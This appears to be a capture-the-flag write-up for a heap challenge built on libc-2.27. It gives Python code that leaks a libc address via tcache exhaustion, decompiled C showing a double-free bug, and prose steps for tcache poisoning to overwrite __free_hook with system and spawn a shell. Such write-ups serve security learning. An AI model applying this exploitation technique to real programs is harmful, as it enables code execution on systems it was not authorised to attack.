# leak addr
This elf use the libc-2.27, which has the tcache to manage the chunks.
The first 7 chunks are put in the tcache instead of main arena.
So we should malloc at least 8 small bin chunks with the same size and then free them to leak the libc address.
```python
add('1','127','1','ref','y')
for i in range(2,9):
	add(str(i),'127',str(i),'ref','n')

for i in range(1,9):
	dele(str(i))
dele('1')
list()
p.recvuntil('\x31\x7c\x1b\x5b\x33\x33\x6d')
libc_addr = u64(p.recvuntil('\x1b')[:-1].ljust(8,'\x00')) - 0x3ebca0
print hex(libc_addr)
```
# overwrite fd
If the book 'A' is setted as best seller, we can add a new book 'B' as soon as 'A' is deleted.
At this time, the chunks 'B' uses are freed. 
```c
  if ( ptr )
  {
    --*((_BYTE *)ptr + 49);
    *(_QWORD *)((char *)ptr + 50) = sub_400C4A;
    if ( !*((_BYTE *)ptr + 49) )
    {
      free(*((void **)ptr + 1));
      free(ptr);
    }
  }
```
We can delete book 'B' to the cause double free. So the chunck is put in the tcache twice.
Then we can overwrite the fd in chunk by adding a new book.
# overwrite the free_hook
Because of the overwritting of fd, we can get the chunk in any address to write.
If we overwrite the fd to free_hook address, we can put system address in it.
And then we delete the chunk with string '/bin/sh', we can get shell.
